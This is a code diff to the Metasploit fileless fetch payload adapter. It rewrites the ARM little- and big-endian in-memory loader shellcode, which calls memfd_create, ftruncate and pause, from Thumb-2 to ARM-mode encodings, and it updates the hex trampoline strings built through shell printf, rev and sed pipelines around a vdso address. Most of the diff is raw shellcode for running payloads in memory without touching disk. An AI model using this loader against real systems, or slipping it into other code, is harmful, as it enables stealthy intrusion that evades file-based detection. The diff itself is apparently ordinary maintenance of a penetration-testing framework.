@@ -67,17 +67,17 @@ module Msf::Payload::Adapter::Fetch::Fileless
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
       in_memory_loader_asm = [
-          0x4ff00002, #0x1000:	mov.w	r2, #0	0x4ff00002
-          0x4df8042d, #0x1004:	str	r2, [sp, #-0x4]!	0x4df8042d
-          0x6846, #0x1008:	mov	r0, sp	0x6846
-          0x4ff00101, #0x100a:	mov.w	r1, #1	0x4ff00101
-          0x4ff08307, #0x100e:	mov.w	r7, #0x83	0x4ff08307
-          0x07f1fe07, #0x1012:	add.w	r7, r7, #0xfe	0x07f1fe07
-          0x00df, #0x1016:	svc	#0	0x00df
-          0x4ff05d07, #0x1018:	mov.w	r7, #0x5d	0x4ff05d07
-          0x00df, #0x101c:	svc	#0	0x00df
-          0x4ff01d07, #0x101e:	mov.w	r7, #0x1d	0x4ff01d07
-          0x00df, #0x1022:	svc	#0	0x00df
+        0xe3b02000, #0x1000:	movs	r2, #0	0xe3b02000
+        0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+        0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
+        0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
+        0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
+        0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
+        0xef000000, #0x1018:	svc	#0	0xef000000
+        0xe3a0705d, #0x101c:	mov	r7, #0x5d	0xe3a0705d
+        0xef000000, #0x1020:	svc	#0	0xef000000
+        0xe3a0701d, #0x1024:	mov	r7, #0x1d	0xe3a0701d
+        0xef000000, #0x1028:	svc	#0	0xef000000
       ]
       payload = in_memory_loader_asm.pack("V*")
     when 'armbe'
@@ -85,18 +85,18 @@ module Msf::Payload::Adapter::Fetch::Fileless
       # ftruncate(fd, null)
       # pause()
       in_memory_loader_asm = [
-          0xf04f0200, #0x1000:	mov.w	r2, #0	0xf04f0200
-          0xf84d2d04, #0x1004:	str	r2, [sp, #-0x4]!	0xf84d2d04
-          0x4668, #0x1008:	mov	r0, sp	0x4668
-          0xf04f0101, #0x100a:	mov.w	r1, #1	0xf04f0101
-          0xf04f0783, #0x100e:	mov.w	r7, #0x83	0xf04f0783
-          0xf10707fe, #0x1012:	add.w	r7, r7, #0xfe	0xf10707fe
-          0xdf00, #0x1016:	svc	#0	0xdf00
-          0xf04f075d, #0x1018:	mov.w	r7, #0x5d	0xf04f075d
-          0xdf00, #0x101c:	svc	#0	0xdf00
-          0xf04f071d, #0x101e:	mov.w	r7, #0x1d	0xf04f071d
-          0xdf00, #0x1022:	svc	#0	0xdf00
-      ]
+        0x0020b0e3, #0x1000:	movs	r2, #0	0x0020b0e3
+        0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
+        0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
+        0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
+        0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
+        0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+        0x000000ef, #0x1018:	svc	#0	0x000000ef
+        0x5d70a0e3, #0x101c:	mov	r7, #0x5d	0x5d70a0e3
+        0x000000ef, #0x1020:	svc	#0	0x000000ef
+        0x1d70a0e3, #0x1024:	mov	r7, #0x1d	0x1d70a0e3
+        0x000000ef, #0x1028:	svc	#0	0x000000ef
+]
       payload = in_memory_loader_asm.pack("V*")
     when 'mips64'
       in_memory_loader_asm = [
@@ -218,9 +218,9 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'aarch64'
       %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armle'
-      %^"024a1047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armbe'
-      %^"dff800703847"$(echo $(printf %04x $vdso_addr))^
+      %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
     when 'mipsle'
       %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
     when 'mipsbe'
